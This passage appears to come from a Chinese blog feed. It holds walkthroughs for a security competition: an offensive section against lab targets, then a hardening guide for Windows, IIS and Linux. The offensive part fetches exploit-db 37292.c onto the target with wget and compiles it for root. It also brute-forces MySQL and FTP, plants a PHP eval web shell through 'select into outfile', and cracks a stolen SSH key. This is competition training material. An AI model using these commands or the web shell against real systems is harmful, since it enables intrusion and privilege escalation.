src="/images/wordimage/2022/1020/gcc.png"></p><p>之后就可以把源码复制到KALI桌面上来，，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/linux/local/37292.c ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后就可以开启KALI的web服务，这里开启的是<code>apache2</code>服务，然后把桌面源码直接复制到网页目录下面，当然你也可以直接复制到网页目录下面，具体操作如下图。</p><p><img src="/images/wordimage/2022/1020/kaliweb.png"></p><p>之后回到靶机，使用<code>wget</code>命令下载，具体如下图，这样就把C源码下载到了靶机里面。</p><p><img src="/images/wordimage/2022/1020/tmp.png"></p><p>然后我们就可以使用靶机自带的<code>gcc</code>编译，命令如下，具体如下图。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token number">37292</span>.c -o shell <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/1020/shell.png"></p><p>之后我们在运行生成的shell文件，获取到了root权限，如下图。</p><p><img src="/images/wordimage/2022/1020/getroot.png"></p><p>然后根据题目要求，直接查看<code>/root</code>目录下的txt文本，所以就可以获得最终flag，<code>FLAG[adftutij.txt]</code></p><hr><h3 id="8-内容flag"><a href="#8-内容flag" class="headerlink" title="8.内容flag"></a>8.内容flag</h3><blockquote><p>利用上述漏洞源码后将获得到的靶机/root下的唯一.txt文件的文件内容作为FLAG（形式：[文件内容]）提交</p></blockquote><p>根据上面第7题获得的文本文件，使用cat命令打开之后可以获取，所以flag,<code>FLAG[hyjufk983]</code></p><hr><h2 id="B-2-Linux操作系统渗透测试"><a href="#B-2-Linux操作系统渗透测试" class="headerlink" title="B-2.Linux操作系统渗透测试"></a>B-2.Linux操作系统渗透测试</h2><h3 id="1-获取后缀为-bmp文件的文件名"><a href="#1-获取后缀为-bmp文件的文件名" class="headerlink" title="1.获取后缀为.bmp文件的文件名"></a>1.获取后缀为.bmp文件的文件名</h3><blockquote><ol><li>通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/var/www目录中唯一一个后缀为.bmp文件的文件名称作为Flag值提交；</li></ol></blockquote><p>首先进行简单的nmap扫描，如下图。</p><p><img src="/images/wordimage/2022/1020/nmap2.png"></p><p>这里省去一切步骤，发现有Mysql直接对Mysql进行暴力破解，使用msf，具体如下图设置。</p><p><img src="/images/wordimage/2022/1020/showmysql.png"></p><p>如下图，找到了密码。</p><p><img src="/images/wordimage/2022/1020/mysqlpass.png"></p><blockquote><p>Mysql账户：root</p><p>Mysql密码：aababb</p></blockquote><p>接下来就可以直接连接，然后写入一句话木马，写入一句话木马命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">select</span> <span class="token string">'&lt;?php @eval($_POST["shell"])?>'</span> into outfile <span class="token string">'/var/www/html/muma.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体如下图。</p><p><img src="/images/wordimage/2022/1020/mysqlmuma.png"></p><p>之后就可以访问网站，然后用蚁剑或者菜刀或者其他工具连接即可，这里使用的是蚁剑，如下图。</p><p><img src="/images/wordimage/2022/1020/mysqlshell.png"></p><p>然后就可以找到题目要求的文件，如下图，所以flag为：<code>FLAG[wuslwczr]</code></p><p><img src="/images/wordimage/2022/1020/flag2.png"></p><hr><h3 id="2-图片文件中的英文单词"><a href="#2-图片文件中的英文单词" class="headerlink" title="2.图片文件中的英文单词"></a>2.图片文件中的英文单词</h3><blockquote><ol start="2"><li>通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/var/www目录中唯一一个后缀为.bmp的图片文件中的英文单词作为Flag值提交；</li></ol></blockquote><p>很简单打开上面获取的bmp即可，如下图，所以flag为,<code>FLAG[gutldhan]</code></p><p><img src="/images/wordimage/2022/1020/gutldhan.png"></p><hr><h3 id="3-var-vsftpd目录中后缀为-docx文件"><a href="#3-var-vsftpd目录中后缀为-docx文件" class="headerlink" title="3./var/vsftpd目录中后缀为.docx文件"></a>3./var/vsftpd目录中后缀为.docx文件</h3><blockquote><ol><li>通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/var/vsftpd目录中唯一一个后缀为.docx文件的文件名称作为Flag值提交；</li></ol></blockquote><p>如下图，不能通关蚁剑直接查看，思路是获取ftp用户密码登录查看。</p><p><img src="/images/wordimage/2022/1020/noftp.png"></p><p>首先查看<code>/etc/passwd</code>查看用户，如下图，发现两个用户，可以使用<code>hydra</code>进行暴力破解ftp</p><p><img src="/images/wordimage/2022/1020/twousers.png"></p><p>使用hydra进行暴力破解，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L user.txt -P rockyou.txt ftp://192.168.10.68<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体如下图，获得两个账户密码。</p><blockquote><p>账户1：drunk915，密码：aaabb3</p><p>账户2：reafcn137，密码：aaabba</p></blockquote><p><img src="/images/wordimage/2022/1020/ftpuserpass.png"></p><p>接下来就可以登录FTP查看文件，如下图，所以根据题目获得flag，<code>FLAG[bmqfldne]</code></p><p><img src="/images/wordimage/2022/1020/bmqfldne.png"></p><hr><h3 id="4-获取docx的内容"><a href="#4-获取docx的内容" class="headerlink" title="4.获取docx的内容"></a>4.获取docx的内容</h3><blockquote><ol><li>通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/var/vsftpd目录中唯一一个后缀为.docx文件的文件内容作为Flag值提交；</li></ol></blockquote><p>还是根据上面的获取的docx文件打开即可，使用命令如下，下载成功之后直接打卡即可，所以获得FLAG，<code>FLAG[tywajsfk]</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">get bmqfldne.docx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，</p><p><img src="/images/wordimage/2022/1020/tywajsfk.png"></p><hr><h3 id="5-home-guest目录中后缀为-pdf"><a href="#5-home-guest目录中后缀为-pdf" class="headerlink" title="5./home/guest目录中后缀为.pdf"></a>5./home/guest目录中后缀为.pdf</h3><blockquote><p>5.通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/home/guest目录中唯一一个后缀为.pdf文件的文件名称作为Flag值提交；</p></blockquote><p>登录drunk915用户即可看见，如下图，所以flag是，<code>FLAG[useansma]</code></p><p><img src="/images/wordimage/2022/1020/useansma.png"></p><hr><h3 id="6-获取pdf内容"><a href="#6-获取pdf内容" class="headerlink" title="6.获取pdf内容"></a>6.获取pdf内容</h3><blockquote><ol start="6"><li>通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/home/guest目录中唯一一个后缀为.pdf文件的文件内容作为Flag值提交；</li></ol></blockquote><p>命令如下，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">get useansma.pdf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，获取到flag，<code>FLAG[jtluqwtr]</code></p><p><img src="/images/wordimage/2022/1020/jtluqwtr.png"></p><hr><h3 id="7-获得root下的txt"><a href="#7-获得root下的txt" class="headerlink" title="7.获得root下的txt"></a>7.获得root下的txt</h3><blockquote><p>7.通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/root目录中唯一一个后缀为.txt文件的文件名称</p></blockquote><p>无</p><hr><h3 id="8-获取root下的txt文本里面的内容"><a href="#8-获取root下的txt文本里面的内容" class="headerlink" title="8.获取root下的txt文本里面的内容"></a>8.获取root下的txt文本里面的内容</h3><blockquote><ol start="8"><li>通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，将该场景/root目录中唯一一个后缀为.txt文件的文件内容作为Flag值提交。</li></ol></blockquote><p>无</p><hr><h2 id="B-3-应用服务漏洞扫描与利用"><a href="#B-3-应用服务漏洞扫描与利用" class="headerlink" title="B-3.应用服务漏洞扫描与利用"></a>B-3.应用服务漏洞扫描与利用</h2><h3 id="1-nmap探测目标靶机的服务版本信息"><a href="#1-nmap探测目标靶机的服务版本信息" class="headerlink" title="1.nmap探测目标靶机的服务版本信息"></a>1.nmap探测目标靶机的服务版本信息</h3><blockquote><p>1.使用命令nmap探测目标靶机的服务版本信息，将需要使用的参数作为FLAG进行提交；</p></blockquote><p>使用扫描版本的命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sV <span class="token number">192.168</span>.10.76<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，所以FLAG是，<code>FLAG[sV]</code></p><p><img src="/images/wordimage/2022/1020/nmapsv.png"></p><hr><h3 id="2-找到敏感文件"><a href="#2-找到敏感文件" class="headerlink" title="2.找到敏感文件"></a>2.找到敏感文件</h3><blockquote><p>2.通过上述端口访问靶机系统并探测隐藏的页面，将找到的敏感文件、目录名作为FLAG（形式：[敏感文件或目录1,敏感文件或目录2…,敏感文件或目录n]）提交；</p></blockquote><p>根据题目要求可以使用kali自带的dirb工具来进行扫描，如下图，扫80端口没扫出来什么，但是31337端口也开放了web服务所以扫描31337端口，扫出来了一堆敏感目录，如下图。</p><p><img src="/images/wordimage/2022/1020/dirb.png"></p><hr><h3 id="3-私钥和认证关键字文件"><a href="#3-私钥和认证关键字文件" class="headerlink" title="3.私钥和认证关键字文件"></a>3.私钥和认证关键字文件</h3><blockquote><p>3.通过上述敏感文件或目录下载可利用的私钥和认证关键字文件，将私钥文件名和认证关键字文件名作为FLAG（形式：[私钥文件名,认证关键字文件名]）进行提交；</p></blockquote><p>在第二题扫出来了.ssh隐藏文件，可以直接打开浏览器访问，如下图，所以获取FLAG，<code>FLAG[&#39;id_rsa&#39;,&#39;authorized_keys&#39;]</code></p><p><img src="/images/wordimage/2022/1020/sshfile.png"></p><hr><h3 id="4-认证关键字文件中的用户名"><a href="#4-认证关键字文件中的用户名" class="headerlink" title="4.认证关键字文件中的用户名"></a>4.认证关键字文件中的用户名</h3><blockquote><p>4.查找认证关键字文件中用于登录靶机服务器的用户名，将用户名作为FLAG提交；</p></blockquote><p>在上面题找到的文件可以使用历览器的方式下载，然后直接使用cat命令查看即可，具体如下图，所以FLAG是，<code>FLAG[simon]</code></p><p><img src="/images/wordimage/2022/1020/simon.png"></p><hr><h3 id="5-用户名及私钥登录靶机服务器"><a href="#5-用户名及私钥登录靶机服务器" class="headerlink" title="5.用户名及私钥登录靶机服务器"></a>5.用户名及私钥登录靶机服务器</h3><blockquote><p>5.使用该用户名及私钥登录靶机服务器，将服务器返回信息的第一行结尾的最后一个英文单词作为FLAG提交；</p></blockquote><p>使用命令如下，具体如下图，所以获得FLAG为,<code>FLAG[open]</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -i id_rsa simon@192.168.10.76<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/1020/open.png"></p><hr><h3 id="6-解密私钥文件"><a href="#6-解密私钥文件" class="headerlink" title="6.解密私钥文件"></a>6.解密私钥文件</h3><blockquote><p>6.将私钥文件进行格式转换后进行解密，将成功解密出的密码作为FLAG提交；</p></blockquote><p>这里需要用到<code>ssh2john</code>这个工具来进行解密，但是kali没有，但是又在这个目录找到了<code>/usr/share/john/ssh2john.py</code>里面，所以可以使用的两个命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#/usr/share/john/ssh2john.py id_rsa > t.txt</span><span class="token comment">#john t.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>具体如下图，获得密码，所以flag是，<code>FLAG[starwars]</code></p><p><img src="/images/wordimage/2022/1020/starwars.png"></p><hr><h3 id="7-溢出程序进行提权"><a href="#7-溢出程序进行提权" class="headerlink" title="7.溢出程序进行提权"></a>7.溢出程序进行提权</h3><blockquote><p>7.利用靶机服务器上的溢出程序进行提权，将接收用户输入的缓冲区的大小作为FLAG提交；</p></blockquote><p>先利用上面获得密码和用户进行登录，登录命令如下，但是有一个问题啊，如果直接使用登录命令进行登录，那么会报错，所以得把文件的权限改低一点，命令是<code>chmod 600 id_rsa</code>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#登录命令</span><span class="token function">ssh</span> -i id_rsa simon@192.168.10.76<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>​    账户：simon</p><p>​    密码：starwars</p></blockquote><p>做到这里我才发现这不就是私钥泄露的题目吗，之前还写过文章，比较懒就直接放文章链接了<a href="https://blog.takagisan.top/2022/04bcba730c.html">私钥泄露</a>。</p><hr><h2 id="B-4-SQL注入测试（PL）"><a href="#B-4-SQL注入测试（PL）" class="headerlink" title="B-4.SQL注入测试（PL）"></a>B-4.SQL注入测试（PL）</h2>]]></content>
      
      
      <categories>
          
          <category> 网络安全金砖五国国赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全金砖五国国赛-a模块-练习题</title>
      <link href="/2022/10ca82b0f.html"/>
      <url>/2022/10ca82b0f.html</url>
      
        <content type="html"><![CDATA[<p>前言</p><p>这是作者这几个月来的第一次更新文章，问就是太忙了，最近要去参加国赛，在此重新回来写文章，也不知道能写多久，就当练习了。</p><hr><h1 id="一-A模块基础设施设置-安全加固"><a href="#一-A模块基础设施设置-安全加固" class="headerlink" title="一.A模块基础设施设置/安全加固"></a>一.A模块基础设施设置/安全加固</h1><h2 id="A-1-登录加固"><a href="#A-1-登录加固" class="headerlink" title="A-1.登录加固"></a>A-1.登录加固</h2><h3 id="1-密码策略"><a href="#1-密码策略" class="headerlink" title="1.密码策略"></a>1.密码策略</h3><blockquote><p>a.最小密码长度不少于8个字符，将密码长度最小值的属性配置界面截图。</p></blockquote><p>练习用的WindowsServer2008,系统左下角开始  &gt; 管理工具 &gt; 本地安全策略 &gt; 账户策略 &gt; 密码策略 &gt; 密码最小长度，如下图👇。</p><p><img src="/images/wordimage/2022/1018/mimachangdu.png"></p><blockquote><p>b.密码策略必须同时满足大小写字母、数字、特殊字符，将密码必须符合复杂性要求的属性配置界面截图</p></blockquote><p>和上面一样的地方，如下图👇。</p><p><img src="/images/wordimage/2022/1018/fuzadu.png"></p><hr><h3 id="2-登录策略"><a href="#2-登录策略" class="headerlink" title="2.登录策略"></a>2.登录策略</h3><blockquote><p>a.在用户登录系统时，应该有“For authorized users only”提示信息，将登录系统时系统弹出警告信息窗口截图；</p></blockquote><p>和上面一样只不过变成了，系统左下角开始  &gt; 管理工具 &gt; 本地安全策略 &gt; 本地策略 &gt; 安全选项 &gt; 交互式登录xx，如下图。</p><p><img src="/images/wordimage/2022/1018/jiaohu.png"></p><blockquote><p>b.一分钟内仅允许5次登录失败的尝试，超过5次，登录帐号锁定1分钟，将账户锁定策略配置界面截图；</p></blockquote><p>位置和上面一样，具体参考下图。</p><p><img src="/images/wordimage/2022/1018/suoding.png"></p><blockquote><p>c.远程用户非活动会话连接超时应小于等于5分钟，将RDP-Tcp属性对应的配置界面截图。</p></blockquote><p>键盘win + r之后输入<strong>tsconfig.msc</strong>，之后打开<strong>RDP-TCP</strong>属性，之后如下图设置。</p><p><img src="/images/wordimage/2022/1018/tsconfig.png"></p><hr><h3 id="3-用户安全管理-Web"><a href="#3-用户安全管理-Web" class="headerlink" title="3.用户安全管理(Web)"></a>3.用户安全管理(Web)</h3><blockquote><p>a.对服务器进行远程管理安全性SSL加固，防止敏感信息泄露被监听，将RDP-Tcp属性对应的配置界面截图；</p></blockquote><p>键盘win + r之后输入<strong>tsconfig.msc</strong>，之后打开<strong>RDP-TCP</strong>属性，之后如下图设置。</p><p><img src="/images/wordimage/2022/1018/SSL.png"></p><blockquote><p>b.仅允许超级管理员账号关闭系统，将关闭系统属性的配置界面截图。</p></blockquote><p>和上面一样，具体如下图查看👇。</p><p><img src="/images/wordimage/2022/1018/guanbixitong.png"></p><hr><h2 id="A-2-Web安全加固-Web"><a href="#A-2-Web安全加固-Web" class="headerlink" title="A-2.Web安全加固(Web)"></a>A-2.Web安全加固(Web)</h2><h3 id="1-数据库加固"><a href="#1-数据库加固" class="headerlink" title="1.数据库加固"></a>1.数据库加固</h3><blockquote><p>1.为了防止web中.mdb数据库文件非法下载，请对Web配置文件进行安全加固，将C:\Windows\System32\inetsrv\config\applicationHost配置文件中对应的部分截图；</p></blockquote><p>根据题目打开路径文件，然后找到如下图行列修改，把false修改为true。</p><p><img src="/images/wordimage/2022/1018/mdbtrue.png"></p><hr><h3 id="2-限制目录"><a href="#2-限制目录" class="headerlink" title="2.限制目录"></a>2.限制目录</h3><blockquote><p>2.限制目录执行权限,对picture和upload目录设置执行权限为无，将编辑功能权限的配置界面截图；</p></blockquote><p>左下角开始 &gt; 管理工具 &gt; IIS管理器选择<strong>picture</strong>和<strong>upload</strong>，选择处理程序映射，之后在选项卡右边有编辑功能选项，如下图👇。</p><p><img src="/images/wordimage/2022/1018/picture.png" alt="picture"></p><p><img src="/images/wordimage/2022/1018/upload.png" alt="upload"></p><hr><h3 id="3-日志审计记录"><a href="#3-日志审计记录" class="headerlink" title="3.日志审计记录"></a>3.日志审计记录</h3><blockquote><p>3.开启IIS的日志审计记录(日志文件保存格式为W3C,只记录日期、时间、客户端IP地址、用户名、方法)，将W3C日志记录字段的配置界面截图；</p></blockquote><p>打开IIS管理器，选择默认网站，选择日志选项，具体操作如下图👇。</p><p><img src="/images/wordimage/2022/1018/W3Clog.png"></p><hr><h3 id="4-减轻网站负载"><a href="#4-减轻网站负载" class="headerlink" title="4.减轻网站负载"></a>4.减轻网站负载</h3><blockquote><p>4.为了减轻网站负载，设置网站最大并发连接数为1000，将编辑网站限制的配置界面截图；</p></blockquote><p>打开IIS管理器，选择默认网站，找到右边选项卡<em>限制</em>，具体操作如下图。</p><p><img src="/images/wordimage/2022/1018/xianzhi.png"></p><hr><h3 id="5-防止文件枚举"><a href="#5-防止文件枚举" class="headerlink" title="5.防止文件枚举"></a>5.防止文件枚举</h3><blockquote><p>5.防止文件枚举漏洞枚举网络服务器根目录文件，禁止IIS短文件名泄露，将配置命令截图；</p></blockquote><p>命令是：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FSUTIL 8dot3name <span class="token builtin class-name">set</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图。</p><p><img src="/images/wordimage/2022/1018/8t3.png"></p><hr><h3 id="6-关闭IIS的WebDAV功能"><a href="#6-关闭IIS的WebDAV功能" class="headerlink" title="6.关闭IIS的WebDAV功能"></a>6.关闭IIS的WebDAV功能</h3><blockquote><p>6.关闭IIS的WebDAV功能增强网站的安全性，将警报提示信息截图。</p></blockquote><p>打开IIS管理器，选择默认网站，选择WebDAV创作规则，然后关闭，具体操作如下图。</p><p><img src="/images/wordimage/2022/1018/WebDAV.png"></p><hr><h2 id="A-3-流量完整性保护与事件监控（Web-Log）"><a href="#A-3-流量完整性保护与事件监控（Web-Log）" class="headerlink" title="A-3.流量完整性保护与事件监控（Web,Log）"></a>A-3.流量完整性保护与事件监控（Web,Log）</h2><h3 id="1-证书登陆SSH"><a href="#1-证书登陆SSH" class="headerlink" title="1.证书登陆SSH"></a>1.证书登陆SSH</h3><blockquote><p>1.为了防止密码在登录或者传输信息时被窃取，仅使用证书登录SSH（Log），将/etc/ssh/sshd_config配置文件中对应的部分截图； </p></blockquote><p>打开LogLinux机器，按照题目要求打开路径具体操作如下图。</p><p><img src="/images/wordimage/2022/1018/linxpassword.png"></p><hr><h3 id="2-开启审核策略"><a href="#2-开启审核策略" class="headerlink" title="2.开启审核策略"></a>2.开启审核策略</h3><blockquote><p>2.将Web服务器开启审核策略</p><p>登录事件 成功/失败;</p><p>特权使用 成功;</p><p>策略更改 成功/失败;</p><p>进程跟踪 成功/失败;</p><p>将审核策略的配置界面截图；</p></blockquote><p>打开windows机器，开始 &gt; 管理工具 &gt; 本地安全策略 &gt; 本地策略 &gt; 审核策略，具体操作如下图。</p><p><img src="/images/wordimage/2022/1018/shenhe.png"></p><hr><h3 id="3-配置Splunk"><a href="#3-配置Splunk" class="headerlink" title="3.配置Splunk"></a>3.配置Splunk</h3><blockquote><p>3.配置Splunk接收Web服务器，安全日志，系统日志，CPU负载，内存，磁盘空间，网络状态。将转发器：部署成功的页面截图。</p></blockquote><p>参考别人文章：<a href="https://blog.csdn.net/qqqwww_sssd/article/details/125422261">配置Splunk</a></p><hr><h2 id="A-4-防火墙策略"><a href="#A-4-防火墙策略" class="headerlink" title="A-4.防火墙策略"></a>A-4.防火墙策略</h2><h3 id="1-Windows禁用445端口"><a href="#1-Windows禁用445端口" class="headerlink" title="1.Windows禁用445端口"></a>1.Windows禁用445端口</h3><blockquote><p>1.Windows系统禁用445端口，将防火墙入站规则截图；</p></blockquote><p>打开Windows高级防火墙，新建规则，具体操作如下图。</p><p><img src="/images/wordimage/2022/1018/port.png"></p><p><img src="/images/wordimage/2022/1018/445.png"></p><p><img src="/images/wordimage/2022/1018/zuzhulianjie.png"></p><p>之后一路下一步下一步，名称取名字即可。</p><hr><h3 id="2-linux禁用端口"><a href="#2-linux禁用端口" class="headerlink" title="2.linux禁用端口"></a>2.linux禁用端口</h3><blockquote><p>2.Linux系统禁用23端口，将iptables配置命令截图</p></blockquote><p>命令是：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iptables -A INPUT -p tcp --dport <span class="token number">23</span> -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体如下图。</p><p><img src="/images/wordimage/2022/1018/closer23port.png"></p><hr><h3 id="3-Linux禁Ping"><a href="#3-Linux禁Ping" class="headerlink" title="3.Linux禁Ping"></a>3.Linux禁Ping</h3><blockquote><p>3.Linux系统禁止别人ping通，将iptables配置命令截图；</p></blockquote><p>命令是：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iptables -A INPUT -p icmp --icmp-type <span class="token number">8</span> -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体如下图。</p><p><img src="/images/wordimage/2022/1018/jinzhiping.png"></p><hr><h3 id="4-Linux只允许某IP连接"><a href="#4-Linux只允许某IP连接" class="headerlink" title="4.Linux只允许某IP连接"></a>4.Linux只允许某IP连接</h3><blockquote><p>4.Linux系统为确保安全禁止所有人连接SSH除了172.16.1.1这个ip，将iptables配置命令截图。</p></blockquote><p>命令是：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iptables -A INPUT -p tcp --dport <span class="token number">22</span> -s <span class="token number">172.16</span>.1.1 -j ACCEPTiptables -A INPUT -p tcp --dport <span class="token number">22</span> -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>具体如下图。</p><p><img src="/images/wordimage/2022/1018/iplinux.png"></p><hr><h2 id="A-5-Windows操作系统安全配置"><a href="#A-5-Windows操作系统安全配置" class="headerlink" title="A-5.Windows操作系统安全配置"></a>A-5.Windows操作系统安全配置</h2><p>请对服务器WindowsServer按要求进行相应的设置，提高服务器的安全性。</p><p>其实和上面的配置差不多，但是还是写吧。</p><h3 id="1-密码策略-1"><a href="#1-密码策略-1" class="headerlink" title="1.密码策略"></a>1.密码策略</h3><blockquote><p>1.设置密码策略必须同时满足大小写字母、数字、特殊字符，最小密码长度不少于8个字符，密码最长使用期限为15天。将服务器上密码策略配置信息截图;</p></blockquote><p>开始 &gt; 管理工具 &gt; 本地安全策略 &gt; 密码策略，具体如下图。</p><p><img src="/images/wordimage/2022/1018/passwordsetting.png" alt="密码必须满足大小写字母"></p><p><img src="/images/wordimage/2022/1018/minpassword.png" alt="密码长度不少于8个字符"></p><p><img src="/images/wordimage/2022/1018/maxpasswordday.png" alt="密码醉倒使用期限"></p><hr><h3 id="2-登录提示信息"><a href="#2-登录提示信息" class="headerlink" title="2.登录提示信息"></a>2.登录提示信息</h3><blockquote><p>2.在用户登录系统时，应该有“For authorized users only”提示信息，将登录系统时系统弹出警告信息窗口截图;</p></blockquote><p>开始 &gt; 管理工具 &gt; 本地安全策略 &gt; 安全选项 &gt; 交互式登录，具体如下图。</p><p><img src="/images/wordimage/2022/1018/denglujiaoh.png" alt="设置"></p><p><img src="/images/wordimage/2022/1018/tishi.png" alt="登录提示"></p><hr><h3 id="3-允许登录失败5次"><a href="#3-允许登录失败5次" class="headerlink" title="3.允许登录失败5次"></a>3.允许登录失败5次</h3><blockquote><p>3.一分钟内仅允许5次登录失败的尝试，超过5次，登录帐号锁定1分钟,将账号锁定策略配置信息截图；</p></blockquote><p>开始 &gt; 管理工具 &gt; 本地安全策略 &gt; 账户策略 &gt; 账户锁定策略，具体如下图。</p><p><img src="/images/wordimage/2022/1018/passwordcelue.png"></p><hr><h3 id="4-设置RDP-TCP"><a href="#4-设置RDP-TCP" class="headerlink" title="4.设置RDP-TCP"></a>4.设置RDP-TCP</h3><blockquote><p>4.设置远程桌面用户非活动会话连接超时应小于等于5分钟，将RDP-Tcp属性对应的配置界面截图；</p></blockquote><p>win + r输入<strong>tsconfig.msc</strong>，选择RDP-TCP属性，具体操作如下图。</p><p><img src="/images/wordimage/2022/1018/zuixiao.png"></p><hr><h3 id="5-通过SSL加密服务器远程桌面"><a href="#5-通过SSL加密服务器远程桌面" class="headerlink" title="5.通过SSL加密服务器远程桌面"></a>5.通过SSL加密服务器远程桌面</h3><p>和上面一样的位置，具体操作如下图。</p><p><img src="/images/wordimage/2022/1018/SSLsetting.png"></p><hr><h3 id="6-只允许超级管理员关闭系统"><a href="#6-只允许超级管理员关闭系统" class="headerlink" title="6.只允许超级管理员关闭系统"></a>6.只允许超级管理员关闭系统</h3><blockquote><p>6.仅允许超级管理员账号关闭系统，将关闭系统属性的配置界面截图；</p></blockquote><p>开始 &gt; 管理工具 &gt; 本地安全策略 &gt; 本地策略 &gt; 用户权限分配，具体如下图。</p><p><img src="/images/wordimage/2022/1018/poweroffsystem.png"></p><hr><h3 id="7-开启IIS的日志审计记录"><a href="#7-开启IIS的日志审计记录" class="headerlink" title="7.开启IIS的日志审计记录"></a>7.开启IIS的日志审计记录</h3><blockquote><p>7.开启IIS的日志审计记录，日志文件保存格式为W3C,只记录日期、时间、客户端IP地址、用户名、服务器端口、方法，将W3C日志记录字段的配置界面截图；</p></blockquote><p>打开IIS管理器，选择默认网站，选择日志，具体操作如下图。</p><p><img src="/images/wordimage/2022/1018/rizhi.png"></p><hr><h3 id="8-设置网站最大并发连接"><a href="#8-设置网站最大并发连接" class="headerlink" title="8.设置网站最大并发连接"></a>8.设置网站最大并发连接</h3><blockquote><p>8.设置网站的最大并发连接数为1000，网站连接超时为60s，将编辑网站限制的配置界面截图；</p></blockquote><p>在管理工具打开IIS管理器，选择默认网站，选择右边限制，具体操作如下图。</p><p><img src="/images/wordimage/2022/1018/bingfa.png"></p><hr><h3 id="9-禁用缓存"><a href="#9-禁用缓存" class="headerlink" title="9.禁用缓存"></a>9.禁用缓存</h3><blockquote><p>9.禁用IIS内核缓存，避免对方利用ms15_034漏洞进行DOS攻击，出现蓝屏的现象，将编辑输出缓存设置的配置界面截图；</p></blockquote><p>在管理工具打开IIS管理器，选择默认网站，选择输出缓存，右边菜单选择编辑功能设置，具体如下图。</p><p><img src="/images/wordimage/2022/1018/huancun.png"></p><hr><h3 id="10-设置某用户特定时间登录"><a href="#10-设置某用户特定时间登录" class="headerlink" title="10.设置某用户特定时间登录"></a>10.设置某用户特定时间登录</h3><blockquote><p>10.设置user1用户只能在上班时间（周一至周五的9:00~18:00）可以登录。将user1的登录时间配置界面截图。</p></blockquote><p>需要输入命令，创建用户命令是：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net user 用户名 密码 /add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>题目要求的命令是。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net user user1 /times:M-F,9:00-18:00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体如下图。</p><p><img src="/images/wordimage/2022/1018/netuser.png"></p><hr><h2 id="A-6-Linux操作系统安全配置"><a href="#A-6-Linux操作系统安全配置" class="headerlink" title="A-6.Linux操作系统安全配置"></a>A-6.Linux操作系统安全配置</h2><h3 id="1-设置禁止使用最近用过旧密码"><a href="#1-设置禁止使用最近用过旧密码" class="headerlink" title="1.设置禁止使用最近用过旧密码"></a>1.设置禁止使用最近用过旧密码</h3><blockquote><p>1.设置禁止使用最近用过的6个旧密码，将配置文件中对应的部分截图;</p></blockquote><p>打开机器，对应文件在<code>/etc/pam.d/system-auth</code>里面，使用vim打开，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/pam.d/system-auth<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体修改如下图，最后<code>wq保存退出</code></p><p><img src="/images/wordimage/2022/1018/rember.png"></p><hr><h3 id="2-设置密码复杂程度"><a href="#2-设置密码复杂程度" class="headerlink" title="2.设置密码复杂程度"></a>2.设置密码复杂程度</h3><blockquote><p>设置密码复杂程度，允许重试3次，新密码必须与旧密码有4位不同，最小位数6位，大写字母至少包含2位，小写字母<br> 至少包含3位，特殊字母个数至少包含1位，将配置文件中对应的部分截图;</p></blockquote><p>首先严谨一点，Linux修改这些位置的地方有两个，第一个是在<code>/etc/login.defs</code>下面，如下图。</p><p><img src="/images/wordimage/2022/1018/PASSxiugai.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PASS_MAX_DAYS   <span class="token number">90</span>  　　    <span class="token comment"># 密码最长过期天数</span>PASS_MIN_DAYS   <span class="token number">80</span>  　　　  <span class="token comment"># 